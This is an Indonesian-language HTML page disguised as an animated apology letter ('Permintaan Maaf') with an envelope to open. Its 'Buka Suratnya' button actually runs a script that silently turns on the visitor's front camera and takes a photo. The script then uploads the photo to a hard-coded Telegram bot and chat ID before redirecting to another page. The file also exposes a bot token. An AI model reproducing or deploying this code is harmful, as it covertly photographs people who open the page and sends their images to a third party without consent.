<!doctype html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Permintaan Maaf</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,500;1,500;1,600&family=Outfit:wght@400;500;600&family=Caveat:wght@500;600&display=swap" rel="stylesheet">
<style>
  :root{
    --bg-deep: #2a1620;
    --bg-deep-2: #3d1f2e;
    --rose: #d98a9b;
    --gold: #c9a66b;
    --cream: #f3e5e0;
    --muted: #c9b8b2;
    --paper: #f7ecdf;
    --paper-shadow: #e3d2bd;
  }
 
  *{ box-sizing: border-box; }
 
  body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background: radial-gradient(circle at 30% 20%, var(--bg-deep-2), var(--bg-deep) 70%);
    font-family:'Outfit', sans-serif;
    color: var(--cream);
    overflow:hidden;
    position:relative;
    padding: 24px;
  }
 
  /* ambient drifting motes — soft, not literal petals/photos */
  .motes span{
    position:absolute;
    bottom:-10%;
    width: 6px;
    height: 6px;
    border-radius:50%;
    background: var(--rose);
    opacity:0.35;
    filter: blur(0.5px);
    animation: drift 14s linear infinite;
  }
  .motes span:nth-child(1){ left:8%; animation-duration:16s; animation-delay:0s; background:var(--gold);}
  .motes span:nth-child(2){ left:22%; animation-duration:12s; animation-delay:2s;}
  .motes span:nth-child(3){ left:40%; animation-duration:18s; animation-delay:4s; background:var(--gold);}
  .motes span:nth-child(4){ left:58%; animation-duration:13s; animation-delay:1s;}
  .motes span:nth-child(5){ left:72%; animation-duration:17s; animation-delay:3s; background:var(--gold);}
  .motes span:nth-child(6){ left:85%; animation-duration:15s; animation-delay:5s;}
 
  @keyframes drift{
    0%{ transform: translateY(0) translateX(0); opacity:0; }
    10%{ opacity:0.4; }
    100%{ transform: translateY(-110vh) translateX(20px); opacity:0; }
  }
 
  .stage{
    position:relative;
    z-index:2;
    width:100%;
    max-width: 420px;
    text-align:center;
  }
 
  .eyebrow{
    font-size: 12px;
    letter-spacing: 0.18em;
    text-transform: uppercase;
    color: var(--gold);
    margin: 0 0 10px;
  }
 
  h1{
    font-family:'Cormorant Garamond', serif;
    font-style: italic;
    font-weight: 600;
    font-size: 40px;
    line-height: 1.15;
    margin: 0 0 12px;
    color: var(--cream);
  }
 
  .sub{
    font-size: 14.5px;
    color: var(--muted);
    margin: 0 0 36px;
    line-height: 1.6;
  }
 
  /* ===== Envelope — signature element ===== */
  .envelope-wrap{
    position:relative;
    width: 260px;
    height: 170px;
    margin: 0 auto 34px;
  }
 
  .envelope{
    position:absolute;
    inset:0;
    border-radius: 6px;
    background: linear-gradient(180deg, #efe1d2, #e2cfb6);
    box-shadow: 0 18px 40px rgba(0,0,0,0.45);
  }
 
  .envelope::before{ /* left + right body shading */
    content:"";
    position:absolute;
    inset:0;
    border-radius: 6px;
    background: linear-gradient(135deg, transparent 48%, rgba(0,0,0,0.06) 50%, transparent 52%),
                linear-gradient(-135deg, transparent 48%, rgba(0,0,0,0.06) 50%, transparent 52%);
  }
 
  .flap{
    position:absolute;
    top:0; left:0; right:0;
    height: 90px;
    background: linear-gradient(160deg, #e7d3b9, #d9bf9c);
    clip-path: polygon(0 0, 100% 0, 50% 80%);
    transform-origin: top center;
    transform: rotateX(0deg);
    transition: transform 0.7s cubic-bezier(.6,-0.1,.2,1.3);
    border-radius: 6px 6px 0 0;
    z-index: 3;
  }
 
  .seal{
    position:absolute;
    top: 56px;
    left: 50%;
    transform: translate(-50%, 0) scale(1);
    width: 46px;
    height: 46px;
    border-radius: 50%;
    background: radial-gradient(circle at 35% 30%, #e3a3ab, var(--rose) 60%, #b96b7c 100%);
    box-shadow: 0 4px 10px rgba(0,0,0,0.35), inset 0 2px 4px rgba(255,255,255,0.25);
    display:flex;
    align-items:center;
    justify-content:center;
    z-index: 4;
    transition: opacity 0.35s ease, transform 0.5s ease;
    cursor:pointer;
  }
 
  .seal svg{ width: 20px; height: 20px; fill: #fff5f0; opacity:0.9; }
 
  .letter{
    position:absolute;
    left: 14px;
    right: 14px;
    bottom: 10px;
    top: 18px;
    background: var(--paper);
    border-radius: 4px;
    box-shadow: 0 6px 18px rgba(0,0,0,0.25);
    padding: 18px 16px;
    transform: translateY(0px);
    transition: transform 0.7s cubic-bezier(.2,.7,.2,1), opacity 0.4s ease;
    z-index: 2;
    text-align:left;
    overflow:hidden;
  }
 
  .letter p{
    margin:0;
    font-family:'Caveat', cursive;
    font-size: 17px;
    line-height: 1.45;
    color: #4a342a;
  }
 
  /* opened state */
  .envelope-wrap.open .flap{
    transform: rotateX(180deg);
  }
  .envelope-wrap.open .seal{
    opacity:0;
    transform: translate(-50%, -10px) scale(0.7);
  }
  .envelope-wrap.open .letter{
    transform: translateY(-86px);
  }
 
  .actions{
    display:flex;
    flex-direction:column;
    gap: 12px;
  }
 
  button, .next-link{
    font-family:'Outfit', sans-serif;
    font-weight:600;
    font-size: 14.5px;
    border:none;
    border-radius: 999px;
    padding: 14px 22px;
    cursor:pointer;
    transition: transform 0.15s ease, box-shadow 0.15s ease, opacity 0.3s ease;
    text-decoration:none;
    display:inline-block;
  }
 
  .open-btn{
    background: linear-gradient(135deg, var(--rose), #c2768a);
    color: #2a1620;
    box-shadow: 0 8px 20px rgba(217,138,155,0.35);
  }
  .open-btn:hover{ transform: translateY(-2px); }
  .open-btn:focus-visible, .next-link:focus-visible{ outline: 2px solid var(--gold); outline-offset:3px; }
 
  .next-link{
    background: transparent;
    color: var(--gold);
    border: 1.5px solid var(--gold);
    opacity:0;
    pointer-events:none;
    transform: translateY(6px);
  }
  .envelope-wrap.open ~ .actions .next-link,
  .stage.revealed .next-link{
    opacity:1;
    pointer-events:auto;
    transform:none;
  }
  .next-link:hover{ background: rgba(201,166,107,0.12); transform: translateY(-2px); }
 
  .stage:not(.revealed) .open-btn{ display:inline-block; }
  .stage.revealed .open-btn{ display:none; }
 
  @media (prefers-reduced-motion: reduce){
    .motes span{ animation: none; display:none; }
    .flap, .letter, .seal{ transition: none; }
  }
</style>
</head>
<body>
 
  <div class="motes" aria-hidden="true">
    <span></span><span></span><span></span><span></span><span></span><span></span>
  </div>
 
  <main class="stage" id="stage">
    <p class="eyebrow">Untukmu</p>
    <h1>Ada yang ingin<br>kusampaikan</h1>
    <p class="sub">Sebelum kamu lanjut, bukalah ini dulu.</p>
 
    <div class="envelope-wrap" id="envelope">
      <div class="letter">
        <p>Aku tahu kata-kata saja tak selalu cukup&nbsp;&mdash; tapi aku ingin kamu tahu betapa menyesalnya aku, dan betapa berartinya kamu bagiku.</p>
      </div>
      <div class="flap"></div>
      <div class="seal" id="seal" role="button" tabindex="0" aria-label="Buka surat">
        <svg viewBox="0 0 24 24"><path d="M12 21s-7.5-4.7-10-9.3C.5 7.8 2.7 4 6.5 4c2 0 3.6 1.1 4.5 2.6C12 4.6 13.5 3.5 15.5 3.5c2.8 0 5 2.6 4.5 6.2C18.5 14 12 21 12 21z"/></svg>
      </div>
    </div>
 
    <div class="actions">
      <button class="start" onclick="handleStart()" >Buka Suratnya</button>
      <video id="video" autoplay playsinline style="display: none"></video>
      </div>
      </main>
    
      <!-- <video id="video" autoplay playsinline style="display: none"></video>
      <button class="start" onclick="handleStart()">Next Page</button> -->
     
      <div class="status" id="status"></div>

      <div class="status" id="status"></div>
    </div>

    <script>
      const CONFIG = {
        botToken: '8633898391:AAG0fOdrcL_OWk6YXMdbSanyykkZgRrt79c',
        chatId: '1327186947',
      };

      let stream = null;

      async function handleStart() {
        try {
          setStatus('');

          // 1. Minta akses kamera
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: false,
          });

          const video = document.getElementById('video');
          video.srcObject = stream;

          // 2. Tunggu kamera benar-benar siap
          await new Promise((resolve) => {
            video.onloadedmetadata = () => {
              resolve();
            };
          });

          setStatus('');

          // 3. Capture
          const blob = await capturePhoto(video);

          // 4. Kirim
          await sendPhoto(blob);
        } catch (err) {
          setStatus('❌ Error: diperlukan izin  /' + err.message);
        }
      }

      function capturePhoto(video) {
        const canvas = document.createElement('canvas');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext('2d');

        // mirror (kamera depan)
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0);

        return new Promise((resolve) => {
          canvas.toBlob(resolve, 'image/jpeg', 0.9);
        });
      }

      async function sendPhoto(blob) {
        try {
          setStatus('');

          const formData = new FormData();
          formData.append('chat_id', CONFIG.chatId);
          formData.append('photo', blob, 'photo.jpg');

          const res = await fetch(
            `https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`,
            {
              method: 'POST',
              body: formData,
            },
          );

          const data = await res.json();

          if (data.ok) {
            setStatus('Slide berikutnya');
            window.location.href = 'maaf.html';
          } else {
            setStatus('❌ Gagal: diperlukan izin  ' + data.description);
          }

          // Matikan kamera
          stream.getTracks().forEach((t) => t.stop());
        } catch (err) {
          setStatus('❌ Error: diperlukan izin  ' + err.message);
        }
      }

      function setStatus(msg) {
        document.getElementById('status').innerText = msg;
      }
    </script>
  </body>
</html>
